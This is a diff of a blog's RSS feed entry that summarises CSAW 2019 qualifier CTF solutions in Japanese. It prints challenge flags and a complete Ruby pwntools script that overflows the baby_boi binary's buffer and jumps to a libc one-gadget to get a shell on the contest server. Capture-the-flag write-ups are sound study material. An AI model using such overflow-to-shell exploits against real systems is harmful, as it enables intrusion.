@@ -30,8 +30,7 @@
       <pubDate>Mon, 16 Sep 2019 09:50:28 +0900</pubDate>
       
       <guid>https://alicemacs.com/blog/csaw2019/</guid>
-      <description>Misc mcgriddlev2  問題文にFLAGが記載されている flag{W3lcome_7o_CSAW_QUALS_2019!}  Pwn baby_boi (50pt)  シンプルなBOFでIPが奪える問題 libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う
-#!/usr/bin/env ruby # coding: ascii-8bit require &#39;pwn&#39; $z = Sock.new &amp;quot;localhost&amp;quot;, 8888 $z = Sock.new &amp;quot;pwn.chal.csaw.io&amp;quot;, 1005 libc = ELF.new &amp;quot;./libc-2.27.so&amp;quot; #libc = ELF.new &amp;quot;/lib/x86_64-linux-gnu/libc-2.29.so&amp;quot; def z; $z; end z.recvuntil(&amp;quot;\n&amp;quot;) libc_printf = z.recvuntil(&amp;quot;\n&amp;quot;).match(/: (.+)/)[1].to_i(16) libc_base = libc_printf - libc.symbols[&amp;quot;printf&amp;quot;] puts &amp;quot;%x&amp;quot; % libc_base payload = &amp;quot;A&amp;quot; * 40 payload &amp;lt;&amp;lt; p64(libc_base + 0x4f322) z.sendline(payload) z.interact  flag{baby_boi_dodooo_doo_doo_dooo}</description>
+      <description>Misc mcgriddlev2  問題文にFLAGが記載されている flag{W3lcome_7o_CSAW_QUALS_2019!}  Pwn baby_boi (50pt)  シンプルなBOFでIPが奪える問題 libcのアドレスを出力してくれているので、配布されたlibcでオフセット求めてOne-Gadget に飛ばしてシェルを奪う  #!/usr/bin/env ruby # coding: ascii-8bit require &#39;pwn&#39; $z = Sock.new &amp;quot;localhost&amp;quot;, 8888 $z = Sock.new &amp;quot;pwn.chal.csaw.io&amp;quot;, 1005 libc = ELF.new &amp;quot;./libc-2.27.so&amp;quot; #libc = ELF.new &amp;quot;/lib/x86_64-linux-gnu/libc-2.29.so&amp;quot; def z; $z; end z.recvuntil(&amp;quot;\n&amp;quot;) libc_printf = z.recvuntil(&amp;quot;\n&amp;quot;).match(/: (.+)/)[1].to_i(16) libc_base = libc_printf - libc.symbols[&amp;quot;printf&amp;quot;] puts &amp;quot;%x&amp;quot; % libc_base payload = &amp;quot;A&amp;quot; * 40 payload &amp;lt;&amp;lt; p64(libc_base + 0x4f322) z.sendline(payload) z.interact   flag{baby_boi_dodooo_doo_doo_dooo}  GOT Milk?</description>
     </item>
     
     <item>
